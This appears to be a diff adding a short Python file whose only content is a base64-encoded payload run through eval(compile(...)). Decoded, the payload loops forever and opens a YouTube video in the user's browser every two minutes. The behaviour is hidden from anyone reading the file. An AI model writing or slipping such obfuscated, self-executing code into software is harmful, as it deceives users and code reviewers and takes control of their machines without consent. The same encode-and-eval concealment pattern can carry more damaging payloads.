@@ -1,0 +1,3 @@
+import base64
+code = "aW1wb3J0IHdlYmJyb3dzZXIKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKcHJpbnQoJycpCndoaWxlIFRydWU6CiAgICBzbGVlcCgxMjApCiAgICB1cmwgPSAnaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj04RVZsNEhfazA3dz9yZWw9MCZhdXRvcGxheT0xJwogICAgd2ViYnJvd3Nlci5vcGVuKHVybCk="
+eval(compile(base64.b64decode(code),'<string>','exec'))
